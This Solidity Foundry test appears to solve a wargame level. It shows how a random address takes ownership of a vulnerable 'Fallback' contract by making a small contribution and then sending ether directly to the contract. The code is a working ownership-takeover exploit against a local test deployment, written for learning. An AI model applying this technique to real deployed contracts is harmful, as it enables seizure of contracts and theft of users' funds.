// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/fallback.sol";

contract CounterTest is Test {
    Fallback public fallback_contract;
    event log(uint);

    function setUp() public {
        fallback_contract = new Fallback();
    }

    function test_ClaimingOwnership() public {
        // create a random address
        address someRandomUser = vm.addr(1);
        // dealing with random addres providing eth for further transactions to that random address
        vm.deal(someRandomUser, 1 ether);
        // manipulating msg.sender as we don't want owner to make transactions
        vm.startPrank(someRandomUser);
        // initial contribution
        fallback_contract.contribute{value: 1}();
        console.log("from contract ", fallback_contract.owner());
        console.log("from test ", address(this));
        // checking that owner is this test contract only
        assertEq(
            uint256(uint160(fallback_contract.owner())),
            uint256(uint160(address(this)))
        );

        (bool isSent, ) = address(fallback_contract).call{value: 1}("");
        // checking that we successfully send the eth to fallback contract from someRandomUser
        assertEq(isSent == true ? 1 : 0, 1);
        assertEq(
            uint256(uint160(fallback_contract.owner())),
            uint256(uint160(someRandomUser))
        );
        vm.stopPrank();
    }
}
